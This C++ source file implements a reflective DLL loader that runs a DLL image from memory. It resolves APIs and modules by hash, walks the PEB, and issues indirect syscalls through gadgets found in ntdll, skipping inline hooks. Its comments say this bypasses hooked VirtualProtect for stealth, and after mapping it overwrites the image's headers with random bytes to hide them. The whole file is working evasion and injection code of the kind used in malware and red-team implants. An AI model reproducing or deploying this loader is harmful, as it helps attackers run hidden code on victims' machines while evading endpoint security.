// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "bootstrap.hpp"
#include <intrin.h>
#include <cstdint>

#pragma intrinsic(_ReturnAddress)
#pragma intrinsic(_rotr)

extern "C" LONG SyscallTrampoline(void* entry, ...);

namespace {
    
    constexpr DWORD HASH_KEY = 13;

    constexpr DWORD ror(DWORD d, int n) {
        return (d >> n) | (d << (32 - n));
    }

    constexpr DWORD hash(const char* str) {
        DWORD h = 0;
        while (*str) {
            h = ror(h, HASH_KEY);
            h += *str++;
        }
        return h;
    }

    constexpr DWORD H_KERNEL32      = 0x6A4ABC5B;
    constexpr DWORD H_NTDLL         = 0x3CFA685D;
    constexpr DWORD H_LOADLIBRARYA  = 0xEC0E4E8E;
    constexpr DWORD H_GETPROCADDRESS= 0x7C0DFCAA;
    constexpr DWORD H_FLUSHCACHE    = 0x534C0AB8;

    using LoadLibraryA_t = HMODULE(WINAPI*)(LPCSTR);
    using GetProcAddress_t = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    using NTSTATUS = LONG;
    using NtFlushInstructionCache_t = NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG);
    using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
    
    struct UNICODE_STR {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR Buffer;
    };

    struct LDR_DATA_TABLE_ENTRY_LITE {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        LIST_ENTRY InInitializationOrderLinks;
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STR FullDllName;
        UNICODE_STR BaseDllName;
    };

    struct PEB_LDR_DATA_LITE {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
    };

    struct PEB_LITE {
        BOOLEAN InheritedAddressSpace;
        BOOLEAN ReadImageFileExecOptions;
        BOOLEAN BeingDebugged;
        BOOLEAN BitField;
        HANDLE Mutant;
        PVOID ImageBaseAddress;
        PEB_LDR_DATA_LITE* Ldr;
    };

    struct IMAGE_RELOC {
        WORD offset : 12;
        WORD type : 4;
    };

    __forceinline DWORD CalcHash(char* c) {
        DWORD h = 0;
        do {
            h = _rotr(h, HASH_KEY);
            h += *c;
        } while (*++c);
        return h;
    }
    
    struct SyscallEntry {
        PVOID pSyscallGadget;  // Offset 0 (8 bytes) - ASM reads at [rbx+0] / [x19+0]
        UINT  nArgs;           // Offset 8 (4 bytes) - ASM reads at [rbx+8] / [x19+8]
        WORD  ssn;             // Offset 12 (2 bytes) - ASM reads at [rbx+12] / [x19+12]
    };
    
    __forceinline SyscallEntry ResolveSyscall(ULONG_PTR ntdllBase, DWORD nameHash, UINT nArgs) {
        SyscallEntry result = { nullptr, 0, 0 };
        
        auto ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(
            ntdllBase + reinterpret_cast<PIMAGE_DOS_HEADER>(ntdllBase)->e_lfanew
        );
        auto expDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
            ntdllBase + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        );
        
        auto names = reinterpret_cast<DWORD*>(ntdllBase + expDir->AddressOfNames);
        auto funcs = reinterpret_cast<DWORD*>(ntdllBase + expDir->AddressOfFunctions);
        auto ords = reinterpret_cast<WORD*>(ntdllBase + expDir->AddressOfNameOrdinals);
        
        struct ZwFunc { PVOID addr; DWORD hash; };
        ZwFunc zwFuncs[512];
        DWORD zwCount = 0;
        
        for (DWORD i = 0; i < expDir->NumberOfNames && zwCount < 512; i++) {
            char* name = reinterpret_cast<char*>(ntdllBase + names[i]);
            if (name[0] == 'Z' && name[1] == 'w') {
                zwFuncs[zwCount].addr = reinterpret_cast<PVOID>(ntdllBase + funcs[ords[i]]);
                zwFuncs[zwCount].hash = CalcHash(name);
                zwCount++;
            }
        }
        
        for (DWORD i = 0; i < zwCount - 1; i++) {
            for (DWORD j = 0; j < zwCount - i - 1; j++) {
                if (reinterpret_cast<ULONG_PTR>(zwFuncs[j].addr) >
                    reinterpret_cast<ULONG_PTR>(zwFuncs[j + 1].addr)) {
                    ZwFunc temp = zwFuncs[j];
                    zwFuncs[j] = zwFuncs[j + 1];
                    zwFuncs[j + 1] = temp;
                }
            }
        }
        
        for (WORD ssn = 0; ssn < zwCount; ssn++) {
            if (zwFuncs[ssn].hash == nameHash) {
                auto bytes = reinterpret_cast<uint8_t*>(zwFuncs[ssn].addr);
                
#if defined(_M_X64)
                // Look for: syscall; ret (0F 05 C3)
                for (int offset = 0; offset < 64; offset++) {
                    if (bytes[offset] == 0x0F && bytes[offset + 1] == 0x05 && bytes[offset + 2] == 0xC3) {
                        result.pSyscallGadget = bytes + offset;
                        result.nArgs = nArgs;
                        result.ssn = ssn;
                        return result;
                    }
                    // Skip JMP hooks (E9 xx xx xx xx)
                    if (bytes[offset] == 0xE9) offset += 4;
                }
#elif defined(_M_ARM64)
                // Look for: svc #imm; ret (d4000001 d65f03c0 or similar)
                for (int offset = 0; offset <= 64; offset += 4) {
                    uint32_t instr = *reinterpret_cast<uint32_t*>(bytes + offset);
                    uint32_t nextInstr = *reinterpret_cast<uint32_t*>(bytes + offset + 4);
                    if ((instr & 0xFF000000) == 0xD4000000 && nextInstr == 0xD65F03C0) {
                        result.pSyscallGadget = bytes + offset;
                        result.nArgs = nArgs;
                        result.ssn = ssn;
                        return result;
                    }
                }
#endif
                break;
            }
        }
        
        return result;
    }
    
    // Syscall hashes - computed via constexpr to guarantee match with CalcHash
    constexpr DWORD H_ZwAllocateVirtualMemory = hash("ZwAllocateVirtualMemory");
    constexpr DWORD H_ZwProtectVirtualMemory = hash("ZwProtectVirtualMemory");

    __forceinline DWORD CalcHashModule(UNICODE_STR* name) {
        DWORD h = 0;
        USHORT len = name->Length;
        BYTE* buf = (BYTE*)name->Buffer;
        
        do {
            h = _rotr(h, HASH_KEY);
            if (*buf >= 'a' && *buf <= 'z') h += (*buf - 0x20);
            else h += *buf;
            buf++;
        } while (--len);
        return h;
    }

    __declspec(noinline) ULONG_PTR GetIp() {
        return (ULONG_PTR)_ReturnAddress();
    }

}

extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
    LoadLibraryA_t pLoadLibraryA = nullptr;
    GetProcAddress_t pGetProcAddress = nullptr;
    NtFlushInstructionCache_t pNtFlushInstructionCache = nullptr;

    ULONG_PTR base = GetIp();
    ULONG_PTR peb = 0;
    ULONG_PTR k32Base = 0;
    ULONG_PTR ntdllBase = 0;

    // 1. Find our own base address (MZ header)
    while (true) {
        auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) break;
        }
        base--;
    }

    // 2. Get PEB
#if defined(_M_X64)
    peb = __readgsqword(0x60);
#elif defined(_M_ARM64)
    peb = __readx18qword(0x60);
#else
    return 0;
#endif

    // 3. Find Kernel32 and Ntdll
    auto ldr = reinterpret_cast<PEB_LITE*>(peb)->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;
    auto curr = head->Flink;

    while (curr != head && (!k32Base || !ntdllBase)) {
        auto entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_LITE, InMemoryOrderLinks);
        
        if (entry->BaseDllName.Length > 0) {
            DWORD h = CalcHashModule(&entry->BaseDllName);
            if (h == H_KERNEL32) k32Base = reinterpret_cast<ULONG_PTR>(entry->DllBase);
            else if (h == H_NTDLL) ntdllBase = reinterpret_cast<ULONG_PTR>(entry->DllBase);
        }
        curr = curr->Flink;
    }

    if (!k32Base || !ntdllBase) return 0;

    SyscallEntry scAlloc = ResolveSyscall(ntdllBase, H_ZwAllocateVirtualMemory, 6);
    SyscallEntry scProtect = ResolveSyscall(ntdllBase, H_ZwProtectVirtualMemory, 5);

    if (!scAlloc.pSyscallGadget || !scProtect.pSyscallGadget) return 0;

    // 4. Resolve Kernel32 Imports
    auto ResolveImports = [](ULONG_PTR moduleBase, auto& loadLib, auto& getProc) {
        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(moduleBase + reinterpret_cast<PIMAGE_DOS_HEADER>(moduleBase)->e_lfanew);
        auto exp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(moduleBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        auto names = reinterpret_cast<DWORD*>(moduleBase + exp->AddressOfNames);
        auto funcs = reinterpret_cast<DWORD*>(moduleBase + exp->AddressOfFunctions);
        auto ords = reinterpret_cast<WORD*>(moduleBase + exp->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            char* name = reinterpret_cast<char*>(moduleBase + names[i]);
            DWORD h = CalcHash(name);

            if (h == H_LOADLIBRARYA) loadLib = reinterpret_cast<LoadLibraryA_t>(moduleBase + funcs[ords[i]]);
            else if (h == H_GETPROCADDRESS) getProc = reinterpret_cast<GetProcAddress_t>(moduleBase + funcs[ords[i]]);
        }
    };

    ResolveImports(k32Base, pLoadLibraryA, pGetProcAddress);

    if (!pLoadLibraryA || !pGetProcAddress) return 0;

    // 5. Resolve Ntdll Imports (FlushInstructionCache)
    auto ntNtdll = reinterpret_cast<PIMAGE_NT_HEADERS>(ntdllBase + reinterpret_cast<PIMAGE_DOS_HEADER>(ntdllBase)->e_lfanew);
    auto expNtdll = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(ntdllBase + ntNtdll->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto namesNtdll = reinterpret_cast<DWORD*>(ntdllBase + expNtdll->AddressOfNames);
    auto funcsNtdll = reinterpret_cast<DWORD*>(ntdllBase + expNtdll->AddressOfFunctions);
    auto ordsNtdll = reinterpret_cast<WORD*>(ntdllBase + expNtdll->AddressOfNameOrdinals);

    for (DWORD i = 0; i < expNtdll->NumberOfNames; i++) {
        char* name = reinterpret_cast<char*>(ntdllBase + namesNtdll[i]);
        if (CalcHash(name) == H_FLUSHCACHE) {
            pNtFlushInstructionCache = reinterpret_cast<NtFlushInstructionCache_t>(ntdllBase + funcsNtdll[ordsNtdll[i]]);
            break;
        }
    }

    if (!pNtFlushInstructionCache) return 0;

    // 6. Allocate Memory via DIRECT SYSCALL (CRITICAL STEALTH ENHANCEMENT)
    auto oldNt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + reinterpret_cast<PIMAGE_DOS_HEADER>(base)->e_lfanew);
    
    PVOID newBase = nullptr;
    SIZE_T allocSize = oldNt->OptionalHeader.SizeOfImage;

    NTSTATUS status = SyscallTrampoline(&scAlloc, (HANDLE)-1, &newBase, (ULONG_PTR)0,
                                        &allocSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE);

    if (status != 0 || !newBase) return 0;
    
    ULONG_PTR newBaseAddr = reinterpret_cast<ULONG_PTR>(newBase);

    // 7. Copy Headers (will be destroyed later)
    auto src = reinterpret_cast<BYTE*>(base);
    auto dst = reinterpret_cast<BYTE*>(newBaseAddr);
    for (DWORD i = 0; i < oldNt->OptionalHeader.SizeOfHeaders; i++) {
        dst[i] = src[i];
    }

    // 8. Copy Sections
    auto sec = IMAGE_FIRST_SECTION(oldNt);
    for (WORD i = 0; i < oldNt->FileHeader.NumberOfSections; i++) {
        src = reinterpret_cast<BYTE*>(base + sec[i].PointerToRawData);
        dst = reinterpret_cast<BYTE*>(newBaseAddr + sec[i].VirtualAddress);
        for (DWORD j = 0; j < sec[i].SizeOfRawData; j++) {
            dst[j] = src[j];
        }
    }
    
    DWORD entryPointRva = oldNt->OptionalHeader.AddressOfEntryPoint;

    // 9. Process Relocations
    ULONG_PTR delta = newBaseAddr - oldNt->OptionalHeader.ImageBase;
    auto relocDir = &oldNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    if (relocDir->Size > 0 && delta != 0) {
        auto reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(newBaseAddr + relocDir->VirtualAddress);
        while (reloc->VirtualAddress) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto entry = reinterpret_cast<IMAGE_RELOC*>(reinterpret_cast<ULONG_PTR>(reloc) + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD k = 0; k < count; k++) {
#if defined(_M_X64) || defined(_M_ARM64)
                if (entry[k].type == IMAGE_REL_BASED_DIR64) {
                    *reinterpret_cast<ULONG_PTR*>(newBaseAddr + reloc->VirtualAddress + entry[k].offset) += delta;
                }
#else
                if (entry[k].type == IMAGE_REL_BASED_HIGHLOW) {
                    *reinterpret_cast<DWORD*>(newBaseAddr + reloc->VirtualAddress + entry[k].offset) += static_cast<DWORD>(delta);
                }
#endif
            }
            reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<ULONG_PTR>(reloc) + reloc->SizeOfBlock);
        }
    }

    // 10. Resolve Imports
    auto importDir = &oldNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size > 0) {
        auto import = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(newBaseAddr + importDir->VirtualAddress);
        while (import->Name) {
            char* modName = reinterpret_cast<char*>(newBaseAddr + import->Name);
            HINSTANCE hMod = pLoadLibraryA(modName);
            if (hMod) {
                auto origThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(newBaseAddr + import->OriginalFirstThunk);
                auto thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(newBaseAddr + import->FirstThunk);
                if (!origThunk) origThunk = thunk;

                while (origThunk->u1.AddressOfData) {
                    FARPROC func;
                    if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                        func = pGetProcAddress(hMod, reinterpret_cast<LPCSTR>(origThunk->u1.Ordinal & 0xFFFF));
                    } else {
                        auto ibn = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(newBaseAddr + origThunk->u1.AddressOfData);
                        func = pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk->u1.Function = reinterpret_cast<ULONG_PTR>(func);
                    origThunk++;
                    thunk++;
                }
            }
            import++;
        }
    }
    
    auto newNtHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(newBaseAddr +
                    reinterpret_cast<PIMAGE_DOS_HEADER>(newBaseAddr)->e_lfanew);
    DWORD headerSize = newNtHdr->OptionalHeader.SizeOfHeaders;
    
    auto headerBytes = reinterpret_cast<BYTE*>(newBaseAddr);
    
    // Get entropy seed (platform-agnostic)
#if defined(_M_X64)
    ULONG_PTR seed = __rdtsc();
#elif defined(_M_ARM64)
    LARGE_INTEGER perfCounter;
    perfCounter.QuadPart = 0;
    // Fallback: use base address as seed if no perf counter
    ULONG_PTR seed = newBaseAddr ^ reinterpret_cast<ULONG_PTR>(&seed);
#else
    ULONG_PTR seed = reinterpret_cast<ULONG_PTR>(&seed);
#endif
    
    for (DWORD i = 0; i < headerSize; i++) {
        // Generate pseudo-random byte using simple LCG
        seed = seed * 1103515245 + 12345;
        headerBytes[i] = static_cast<BYTE>((seed >> 16) & 0xFF);
    }

    // 11. Finalize Sections via DIRECT SYSCALL (Set Permissions)
    // Uses NtProtectVirtualMemory instead of hooked VirtualProtect
    sec = IMAGE_FIRST_SECTION(oldNt);
    for (WORD i = 0; i < oldNt->FileHeader.NumberOfSections; i++) {
        ULONG oldProtect;
        ULONG newProtect = PAGE_READONLY;
        
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                newProtect = PAGE_EXECUTE_READWRITE;
            } else {
                newProtect = PAGE_EXECUTE_READ;
            }
        } else if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE;
        }

        PVOID sectionBase = reinterpret_cast<PVOID>(newBaseAddr + sec[i].VirtualAddress);
        SIZE_T sectionSize = sec[i].Misc.VirtualSize;
        
        SyscallTrampoline(&scProtect, (HANDLE)-1, &sectionBase, &sectionSize,
                          (ULONG)newProtect, &oldProtect);
    }

    // 12. Call DllMain
    auto pDllMain = reinterpret_cast<DllMain_t>(newBaseAddr + entryPointRva);
    pNtFlushInstructionCache(reinterpret_cast<HANDLE>(-1), NULL, 0);
    pDllMain(reinterpret_cast<HINSTANCE>(newBaseAddr), DLL_PROCESS_ATTACH, lpParameter);

    return newBaseAddr;
}
